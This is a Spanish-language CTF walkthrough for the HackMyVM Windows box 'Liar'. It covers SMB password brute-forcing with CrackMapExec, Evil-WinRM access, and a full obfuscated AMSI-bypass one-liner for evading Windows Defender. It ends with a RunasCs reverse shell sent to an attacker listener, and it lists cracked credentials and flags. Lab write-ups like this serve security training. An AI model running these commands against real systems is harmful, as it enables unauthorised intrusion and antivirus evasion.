# 🎯 Liar - HackMyVM (Easy - Windows)

## 📋 Info

| Campo | Detalle |
|---|---|
| Máquina | Liar |
| Plataforma | HackMyVM |
| Dificultad | Easy |
| OS | Windows Server 2019 |
| IP | Variable (192.168.0.x) |

---

## 🔍 Reconocimiento

```bash
sudo arp-scan -l
sudo nmap -p- --min-rate 5000 -n -Pn IP_VICTIMA
```

**Puertos abiertos:**
- 80/tcp → HTTP
- 135/tcp → MSRPC
- 139/tcp → NetBIOS
- 445/tcp → SMB
- 5985/tcp → WinRM
- 47001/tcp → WinRM

---

## 🌐 Enumeración Web

```bash
curl -s http://IP_VICTIMA
```

**Respuesta:**
```
Hey bro,
You asked for an easy Windows VM, enjoy it.
- nica
```

Pista clave: usuario **nica**.

---

## 🔑 Credenciales — CrackMapExec

Instalar CrackMapExec si no está:
```bash
sudo apt install crackmapexec -y
```

Brute force usuario nica:
```bash
crackmapexec smb IP_VICTIMA -u nica -p /usr/share/wordlists/rockyou.txt
```

**Credenciales:** `nica:hardcore`

---

## 💻 Acceso WinRM — Evil-WinRM

```bash
evil-winrm -i IP_VICTIMA -u nica -p hardcore
```

**Flag user:**
```powershell
type C:\Users\nica\user.txt
# HMVWINGIFT
```

Enumerar usuarios:
```powershell
net users
# Administrador, akanksha, nica
```

akanksha es miembro de **Idministritirs** (grupo Administradores):
```powershell
net user akanksha
# Miembros del grupo local: *Idministritirs
```

---

## 🔑 Credenciales akanksha — CrackMapExec

```bash
crackmapexec smb IP_VICTIMA -u akanksha -p /usr/share/wordlists/rockyou.txt
```

**Credenciales:** `akanksha:sweetgirl`

---

## 💥 Escalada — Bypass AMSI + Invoke-RunasCs

### 1. Descargar Invoke-RunasCs.ps1

```bash
wget https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1 -P /tmp/
```

### 2. Subir a la víctima

En evil-winrm como nica:
```powershell
upload /tmp/Invoke-RunasCs.ps1
```

### 3. Bypass AMSI

Pegar en evil-winrm (evade Windows Defender):
```powershell
$JmRIgg7pbjB=$null;$J5xhHEldAdGmGsdjV=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+6814-6814));$kdiojlldvsqhsvfjwl="+[ChAr](104+62-62)+[cHAR]([bYte]0x75)";[Threading.Thread]::Sleep(457);[Ref].Assembly.GetType("System.$([CHAr]([byTE]0x4d)+[chAr](24+73)+[cHAr](44+66)+[Char](97+66-66)+[chaR]([BYte]0x67)+[CHAR]([bYtE]0x65)+[cHAr](109+62-62)+[cHaR]([BYTe]0x65)+[cHaR]([ByTe]0x6e)+[cHar]([bYtE]0x74)).$([chaR]([bYTe]0x41)+[CHAR]([BYTe]0x75)+[CHar](116)+[chAr]([BYTE]0x6f)+[CHaR](78+31)+[chAr]([byTE]0x61)+[CHar]([Byte]0x74)+[char](6+99)+[Char](111)+[Char](110*74/74)).$([CHaR]([byte]0x41)+[char](5+104)+[ChaR]([bytE]0x73)+[chAR](105*63/63)+[cHaR](85*29/29)+[CHAR](80+36)+[CHaR](52+53)+[chAR]([BYTe]0x6c)+[ChaR](115*74/74))").GetField("$([ChaR]([bYTe]0x61)+[CHAR](109*65/65)+[Char]([byte]0x73)+[ChaR](105)+[cHar]([bYte]0x53)+[cHar]([byTE]0x65)+[ChaR](115*4/4)+[chaR](115+11-11)+[chAR](105*5/5)+[chAr](111*9/9)+[char]([byte]0x6e))", "NonPublic,Static").SetValue($JmRIgg7pbjB, $JmRIgg7pbjB);[Ref].Assembly.GetType("System.$([CHAr]([byTE]0x4d)+[chAr](24+73)+[cHAr](44+66)+[Char](97+66-66)+[chaR]([BYte]0x67)+[CHAR]([bYtE]0x65)+[cHAr](109+62-62)+[cHaR]([BYTe]0x65)+[cHaR]([ByTe]0x6e)+[cHar]([bYtE]0x74)).$([chaR]([bYTe]0x41)+[CHAR]([BYTe]0x75)+[CHar](116)+[chAr]([BYTE]0x6f)+[CHaR](78+31)+[chAr]([byTE]0x61)+[CHar]([Byte]0x74)+[char](6+99)+[Char](111)+[Char](110*74/74)).$([CHaR]([byte]0x41)+[char](5+104)+[ChaR]([bytE]0x73)+[chAR](105*63/63)+[cHaR](85*29/29)+[CHAR](80+36)+[CHaR](52+53)+[chAR]([BYTe]0x6c)+[ChaR](115*74/74))").GetField("$([CHAr]([BytE]0x61)+[cHar]([BytE]0x6d)+[cHaR]([BYte]0x73)+[cHaR](105)+[cHaR](67+51-51)+[cHaR](111+56-56)+[cHar]([bytE]0x6e)+[cHar]([byTe]0x74)+[ChAR](101*11/11)+[char]([bytE]0x78)+[cHar]([bYte]0x74))", "NonPublic,Static").SetValue($JmRIgg7pbjB, [IntPtr]$J5xhHEldAdGmGsdjV);$ilpowzzhhv="+('cmmîqxácìqmjzvkècmswìf'+'st').NORmaLIzE([cHar](70)+[char](111)+[cHaR](114*77/77)+[char](109+12-12)+[Char](68*1/1)) -replace [CHAR]([ByTE]0x5c)+[chaR]([ByTe]0x70)+[char]([bYTe]0x7b)+[cHAR]([ByTe]0x4d)+[cHaR]([ByTe]0x6e)+[CHAr]([bYtE]0x7d)";[Threading.Thread]::Sleep(1044)
```

Si no aparece error → AMSI bypaseado ✅

### 4. Importar módulo

```powershell
Import-Module ./Invoke-RunasCs.ps1
```

### 5. Listener en Kali

```bash
nc -lvnp 1234
```

### 6. Ejecutar reverse shell como akanksha

```powershell
Invoke-RunasCs akanksha sweetgirl powershell -Remote IP_KALI:1234
```

Shell como **akanksha** (Administrador) 🎉

---

## 🔴 Root

```powershell
whoami
# win-iurf14rbvgv\akanksha

cd C:\Users\Administrador\
type C:\Users\Administrador\root.txt
# HMV1STWINDOWZ
```

---

## 🗺️ Cadena de Ataque

1. **HTTP** → mensaje de `nica` → pista de usuario
2. **CrackMapExec SMB** → `nica:hardcore`
3. **Evil-WinRM** → shell como nica
4. **Flag user** → `HMVWINGIFT`
5. **CrackMapExec SMB** → `akanksha:sweetgirl`
6. **Bypass AMSI** → evadir Windows Defender
7. **Invoke-RunasCs** → reverse shell como akanksha
8. **Flag root** → `HMV1STWINDOWZ`

---

## 📚 Técnicas Aprendidas

- **CrackMapExec** — brute force SMB/WinRM Windows (más fiable que hydra)
- **Evil-WinRM** — shell remota via WinRM
- **AMSI Bypass** — evadir Windows Defender para scripts PowerShell
- **Invoke-RunasCs** — ejecutar procesos como otro usuario Windows
- **Idministritirs** — grupo administradores con nombre mal escrito (trampa común)
